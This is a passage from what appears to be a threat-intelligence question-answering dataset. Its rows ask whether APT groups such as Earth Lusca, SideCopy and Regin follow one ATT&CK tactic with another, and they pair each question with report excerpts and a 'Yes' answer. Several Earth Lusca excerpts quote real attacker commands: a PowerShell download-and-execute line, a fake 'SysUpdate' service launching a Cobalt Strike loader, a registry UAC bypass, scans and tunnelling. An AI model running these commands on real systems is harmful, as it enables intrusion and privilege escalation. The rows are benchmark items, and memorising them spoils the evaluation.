Others: Max Heinemeyer, Director of Threat Hunting at Darktrace, authored the blog post detailing the discovery of APT35's activity. The post highlights the value of self-learning AI in detecting pre-existing infections and 'low and slow' attacks. Darktrace's Proactive Threat Notifications and Antigena could have autonomously enforced normal activity for the device, preventing the C2 traffic without interrupting regular business workflows.",Yes,APT35 ‘Charming Kitten' discovered in a pre-infected environment _ Blog _ Darktrace
2194,376,376-Defense Evasion-T1197-BITS Jobs,"After abusing elevation control mechanisms and employing obfuscation techniques during privilege escalation, is it likely that Earth Lusca would proceed to utilize BITS jobs as a defense evasion technique before targeting user credentials using tools like procdump to dump the memory of the lsass process?","Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2204,376,376-Collection-T1039-Data from Network Shared Drive,"After using tools like HUC Port Banner Scanner, nbtscan, and fscan during the Discovery phase to identify machines and services in the compromised network, is it likely that Earth Lusca will collect data from local systems and network shared drives during the Collection phase before compressing this data using WinRAR for subsequent exfiltration via the megacmd tool?","Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2218,376,376-Reconnaissance-T1590-Gather Victim Network Information,"After gaining initial access to networks through spear phishing emails with malicious links leading to the download of LNK or executable files, is Earth Lusca likely to utilize tools such as 'net', 'nltest', and 'ipconfig' to gather victim network information during the reconnaissance phase before using command interpreters and service creation to execute malicious code?","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.","Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2231,378,378-Initial Access-T1566-Phishing,"After using C&C communication to monitor and extract information from victims, is it likely that Rocket Kitten will employ spear phishing and social engineering to establish initial access on target machines?","Initial Access: The Rocket Kitten Group employs spear phishing and social engineering as their primary point of entry. They establish contact with victims by faking accounts and identities, using fake Google Drive or Gmail accounts, stolen documents, and social media accounts like Facebook. The spear-phishing email contains a link or a file that, when clicked or opened, unleashes a payload that takes over the target machine.","Execution: Rocket Kitten utilizes several different malware types to execute their attacks. They use both simple tools they likely developed and more advanced, publicly available ones, which may have been either purchased or stolen. Despite their lack of professionalism, as evidenced by content mistakes, they compensate with persistence. The group uses a keylogger detected by Trend Micro as TSPY_WOOLERG, which logs keystrokes and connects applications to victims' Gmail accounts as a 'connected app', allowing attackers to download all of their victims' emails for offline processing. They also install other pieces of malware as needed.
Persistence: Rocket Kitten demonstrates persistence by repeatedly attempting to attack the same targets, using new cover stories and techniques to entice users. They execute numerous password-reset attempts to overwhelm targets, making them believe they are losing control over their accounts. The group prefers to target victims' private email addresses and accounts rather than organizational ones, taking advantage of the lack of peripheral protection at home.
Defense Evasion: Rocket Kitten employs various defense evasion techniques, including using fake identities, making phone calls, and sending messages to gain trust. They breach websites to set up phishing pages or register new domains solely for phishing. The group also uses anti-debugging techniques and obfuscates their strings and API calls to avoid detection.
Credential Access: Rocket Kitten uses social engineering and spear phishing to steal credentials. They take over accounts immediately after obtaining passwords through emails, Facebook messages, or phone calls. They employ a keylogger to capture keystrokes and gain access to additional accounts like Facebook, other email accounts, and cloud accounts.
Command and Control: The infected computers communicate with a C&C server, which can download whatever malware is available or intended for the purpose of the attack. The group uses C&C communication to monitor communications and extract information from the victims.",Yes,wp-the-spy-kittens-are-back
2236,378,378-Credential Access-T1056-Input Capture,"After employing a keylogger to capture keystrokes and gain access to additional accounts under Credential Access, is it likely that Rocket Kitten will establish communication with a Command and Control (C&C) server to download malware or monitor the victim's communications?","Credential Access: Rocket Kitten uses social engineering and spear phishing to steal credentials. They take over accounts immediately after obtaining passwords through emails, Facebook messages, or phone calls. They employ a keylogger to capture keystrokes and gain access to additional accounts like Facebook, other email accounts, and cloud accounts.","Initial Access: The Rocket Kitten Group employs spear phishing and social engineering as their primary point of entry. They establish contact with victims by faking accounts and identities, using fake Google Drive or Gmail accounts, stolen documents, and social media accounts like Facebook. The spear-phishing email contains a link or a file that, when clicked or opened, unleashes a payload that takes over the target machine.
Execution: Rocket Kitten utilizes several different malware types to execute their attacks. They use both simple tools they likely developed and more advanced, publicly available ones, which may have been either purchased or stolen. Despite their lack of professionalism, as evidenced by content mistakes, they compensate with persistence. The group uses a keylogger detected by Trend Micro as TSPY_WOOLERG, which logs keystrokes and connects applications to victims' Gmail accounts as a 'connected app', allowing attackers to download all of their victims' emails for offline processing. They also install other pieces of malware as needed.
Persistence: Rocket Kitten demonstrates persistence by repeatedly attempting to attack the same targets, using new cover stories and techniques to entice users. They execute numerous password-reset attempts to overwhelm targets, making them believe they are losing control over their accounts. The group prefers to target victims' private email addresses and accounts rather than organizational ones, taking advantage of the lack of peripheral protection at home.
Defense Evasion: Rocket Kitten employs various defense evasion techniques, including using fake identities, making phone calls, and sending messages to gain trust. They breach websites to set up phishing pages or register new domains solely for phishing. The group also uses anti-debugging techniques and obfuscates their strings and API calls to avoid detection.
Command and Control: The infected computers communicate with a C&C server, which can download whatever malware is available or intended for the purpose of the attack. The group uses C&C communication to monitor communications and extract information from the victims.",Yes,wp-the-spy-kittens-are-back
2241,380,380-Initial Access-T1190-Exploit Public-Facing Application,"After MuddyWater utilizes command and control servers in Pakistan and China to host malicious code and communicate with compromised systems, is it likely that they will leverage a Microsoft Office vulnerability, specifically CVE-2017-0199, to gain initial access to target governmental entities and the telecommunication sector?","Initial Access: The Iranian APT group MuddyWater, also known as SeedWorm/Temp.Zagros, has been observed using two attack vectors to target governmental entities and the telecommunication sector. The first vector involves decoy documents exploiting CVE-2017-0199, a Microsoft Office vulnerability that allows remote attackers to execute arbitrary code. The second vector includes communication with compromised C2 servers to download files infected with macros. Notably, MuddyWater has not previously used CVE-2017-0199, which was associated with another Iranian group named OilRig.","Command and Control: MuddyWater's recent campaign has seen the use of compromised servers to host malicious code for the second stage of attacks. The group has been identified using servers in countries they target, such as a server in Pakistan (hxxp://corplink[.]com[.]pk/wp-content/themes/buisson/16433.jpg) and a server in China (hxxps://bbs[.]kafan[.]cn/thread-2150909-1-1.html). Additionally, a RAT file communicating with the IP address 185.244.149[.]218 was discovered, which sends encoded base64 output to the attacker about processes running on the compromised system.
Others: The MuddyWater group impersonates entities in countries surrounding Iran, including Kurdish groups, governmental actors in Iraq, Tajikistan, Pakistan, India, the UAE, and Cyprus. They have used documents resembling official documents from the regional government of Kurdistan and unofficial documents from countries surrounding Iran. The group's combined attack vector leverages CVE-2017-0199 and sends requests to a hacked server to download a JPG file containing a malicious macro. The documents used in the campaign can be categorized into two groups: those resembling previous documents used by MuddyWater and those written in English disguised as unofficial documents from countries surrounding Iran.",Yes,Clearsky-Iranian-APT-group-‘MuddyWater’-Adds-Exploits-to-Their-Arsenal
2246,381,381-Credential Access-T1056-Input Capture,"After deploying modular plugins for file enumeration, browser password stealing, and keylogging during the collection phase, is SideCopy likely to target Kavach and use GoLang-based file recon plugins to exfiltrate Kavach authentication databases during the credential access tactic?","Credential Access: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.","Reconnaissance: Cisco Talos has observed SideCopy APT's activities targeting government personnel in India, using tactics and themes similar to APT36, which includes using decoys posing as operational documents belonging to the military and think tanks, and honeytrap-based infections. SideCopy campaigns use themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content. SideCopy has shown a particular interest in Kavach, an MFA app used across India's government, deploying njRAT malware with special victim IDs of 'kavach' and using GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Resource Development: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.
Initial Access: SideCopy's infection chains have remained relatively consistent with minor variations, using malicious LNK files as entry points, followed by a convoluted infection chain involving multiple HTAs and loader DLLs to deliver the final payloads. They have also used self-extracting RAR-based dropper executables and MSI-based installers as part of their infection techniques.
Execution: SideCopy deploys a variety of RATs and plugins post-infection, including file enumerators, credential-stealers, and keyloggers. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Persistence: SideCopy uses various techniques to maintain persistence on infected systems, including the use of malicious LNK files, HTAs, loader DLLs, and MSI-based installers. They also use registry keys for persistence and have been observed using VBScripts to persist MargulasRAT via the registry.
Defense Evasion: SideCopy employs tactics to avoid detection, such as using decoy documents and images, and mimicking legitimate processes. They also use cloned websites to serve malicious content and have shown a particular interest in evading detection by targeting Kavach, an MFA app used by the Government of India.
Discovery: SideCopy uses themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content.
Collection: SideCopy utilizes modular plugins to carry out specific malicious tasks on the infected endpoint, such as file enumeration, browser password stealing, and keylogging. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Command and Control: SideCopy's delivery infrastructure consists of either setting up fake websites or using compromised websites to deliver malicious artifacts to specific victims. The delivery scripts verify that requests to receive artifacts/payloads are from two specific geographies: India and Pakistan. All requests are logged to a log file on the delivery server to keep track of artifacts served to potential victims.
Exfiltration: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Others: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.",Yes,SideCopy
2248,381,381-Credential Access-T1555-Credentials from Password Stores,"After gaining initial access through malicious LNK files and delivering payloads via a convoluted infection chain, is SideCopy likely to exfiltrate Kavach authentication databases from infected devices before deploying njRAT malware for credential harvesting?","Credential Access: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.","Reconnaissance: Cisco Talos has observed SideCopy APT's activities targeting government personnel in India, using tactics and themes similar to APT36, which includes using decoys posing as operational documents belonging to the military and think tanks, and honeytrap-based infections. SideCopy campaigns use themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content. SideCopy has shown a particular interest in Kavach, an MFA app used across India's government, deploying njRAT malware with special victim IDs of 'kavach' and using GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Resource Development: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.
Initial Access: SideCopy's infection chains have remained relatively consistent with minor variations, using malicious LNK files as entry points, followed by a convoluted infection chain involving multiple HTAs and loader DLLs to deliver the final payloads. They have also used self-extracting RAR-based dropper executables and MSI-based installers as part of their infection techniques.
Execution: SideCopy deploys a variety of RATs and plugins post-infection, including file enumerators, credential-stealers, and keyloggers. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Persistence: SideCopy uses various techniques to maintain persistence on infected systems, including the use of malicious LNK files, HTAs, loader DLLs, and MSI-based installers. They also use registry keys for persistence and have been observed using VBScripts to persist MargulasRAT via the registry.
Defense Evasion: SideCopy employs tactics to avoid detection, such as using decoy documents and images, and mimicking legitimate processes. They also use cloned websites to serve malicious content and have shown a particular interest in evading detection by targeting Kavach, an MFA app used by the Government of India.
Discovery: SideCopy uses themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content.
Collection: SideCopy utilizes modular plugins to carry out specific malicious tasks on the infected endpoint, such as file enumeration, browser password stealing, and keylogging. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Command and Control: SideCopy's delivery infrastructure consists of either setting up fake websites or using compromised websites to deliver malicious artifacts to specific victims. The delivery scripts verify that requests to receive artifacts/payloads are from two specific geographies: India and Pakistan. All requests are logged to a log file on the delivery server to keep track of artifacts served to potential victims.
Exfiltration: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Others: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.",Yes,SideCopy
2251,381,381-Defense Evasion-T1036-Masquerading,"After maintaining persistence through methods like using registry keys and VBScripts for MargulasRAT, is it likely that SideCopy will employ tactics to evade detection by mimicking legitimate processes or using decoy documents?","Defense Evasion: SideCopy employs tactics to avoid detection, such as using decoy documents and images, and mimicking legitimate processes. They also use cloned websites to serve malicious content and have shown a particular interest in evading detection by targeting Kavach, an MFA app used by the Government of India.","Reconnaissance: Cisco Talos has observed SideCopy APT's activities targeting government personnel in India, using tactics and themes similar to APT36, which includes using decoys posing as operational documents belonging to the military and think tanks, and honeytrap-based infections. SideCopy campaigns use themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content. SideCopy has shown a particular interest in Kavach, an MFA app used across India's government, deploying njRAT malware with special victim IDs of 'kavach' and using GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Resource Development: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.
Initial Access: SideCopy's infection chains have remained relatively consistent with minor variations, using malicious LNK files as entry points, followed by a convoluted infection chain involving multiple HTAs and loader DLLs to deliver the final payloads. They have also used self-extracting RAR-based dropper executables and MSI-based installers as part of their infection techniques.
Execution: SideCopy deploys a variety of RATs and plugins post-infection, including file enumerators, credential-stealers, and keyloggers. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Persistence: SideCopy uses various techniques to maintain persistence on infected systems, including the use of malicious LNK files, HTAs, loader DLLs, and MSI-based installers. They also use registry keys for persistence and have been observed using VBScripts to persist MargulasRAT via the registry.
Credential Access: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Discovery: SideCopy uses themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content.
Collection: SideCopy utilizes modular plugins to carry out specific malicious tasks on the infected endpoint, such as file enumeration, browser password stealing, and keylogging. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Command and Control: SideCopy's delivery infrastructure consists of either setting up fake websites or using compromised websites to deliver malicious artifacts to specific victims. The delivery scripts verify that requests to receive artifacts/payloads are from two specific geographies: India and Pakistan. All requests are logged to a log file on the delivery server to keep track of artifacts served to potential victims.
Exfiltration: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Others: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.",Yes,SideCopy
2274,383,383-Discovery-T1057-Process Discovery,"After executing its multistage payload to inject files into services.exe, is Regin likely to gather information on processes and memory utilization before employing its extensive remote access Trojan capabilities to capture screenshots and crawl through the file system for data collection?","Discovery: Regin's discovery capabilities include gathering information on processes and memory utilization, scanning for deleted files, and retrieving them. It can also monitor network traffic to Microsoft Internet Information Services (IIS) web servers and collect administration traffic for mobile telephony base station controllers.","Initial Access: The CTI report by Symantec Security Response identifies Regin as a sophisticated multi-staged modular threat, with the initial stage (Stage 1) involving the installation and configuration of the threat's internal services. The report, however, does not provide a specific infection vector, stating that it varies among targets and is unconfirmed at the time of writing. It suggests that targets may be tricked into visiting spoofed versions of well-known websites, and the threat may be installed through a web browser or by exploiting an application. In one instance, Regin was observed originating from Yahoo! Instant Messenger through an unconfirmed exploit.
Execution: Regin's execution process is detailed through its multi-staged architecture, which includes six stages. Stage 0, the dropper, is responsible for installing Regin onto the target computer. Stage 1 involves loading a kernel driver that executes Stage 2. Stage 2 is another kernel driver that extracts, installs, and runs Stage 3. Stage 3, a kernel mode DLL, provides a framework for higher-level stages and loads Stage 4. Stage 4 consists of a user-mode orchestrator and multiple kernel payload modules, which are stored in encrypted virtual file system (EVFS) containers. Stage 5 brings into play the main Regin payload functionality, with files injected into services.exe by Stage 4.
Persistence: The CTI report does not provide explicit details on the persistence mechanisms used by Regin, but the multi-staged architecture and the use of kernel drivers and EVFS containers suggest that Regin is designed to maintain a long-term presence on infected systems.
Defense Evasion: Regin employs advanced techniques to conceal itself and its activities on compromised computers. It uses encrypted data blobs stored in non-traditional file storage areas such as the registry, extended attributes, or raw sectors at the end of the disk. The threat's stealth combines many advanced techniques to remain under the radar, making analysis difficult as all components must be available to fully understand it.
Credential Access: Regin is capable of stealing passwords and monitoring network traffic, which may include credential information. It can also scan for deleted files on an infected computer and retrieve them. Specific modules within Regin are designed to steal passwords, such as those for Windows Explorer credentials and Internet Explorer LegacySettings.
Collection: Regin's collection capabilities are extensive, including several remote access Trojan (RAT) features such as capturing screenshots and taking control of the mouse's point-and-click functions. It can also gather computer information, steal passwords, monitor network traffic, and crawl through the file system. Advanced payload modules are designed to sniff low-level network traffic and exfiltrate data through various channels.
Command and Control: Regin's command-and-control (C&C) operations are extensive and bidirectional, allowing attackers to initiate communications with compromised computers or vice versa. Compromised computers can serve as a proxy for other infections, and C&C can happen in a peer-to-peer fashion. All communications are strongly encrypted and can use transport protocols such as ICMP, UDP, TCP, and HTTP. The C&C operations are undertaken by various modules, including major groups C373h, 19h, 9, as well as Stage 5 payloads, such as C375h and 1Bh.
Exfiltration: Regin's exfiltration capabilities include encoding and embedding payload information within cookie data under various names for HTTP-based C&C. It can also exfiltrate data through channels like TCP, UDP, ICMP, and HTTP. The threat logs data to the ApplicationLog.dat file, which is encrypted and compressed.",Yes,regin-analysis
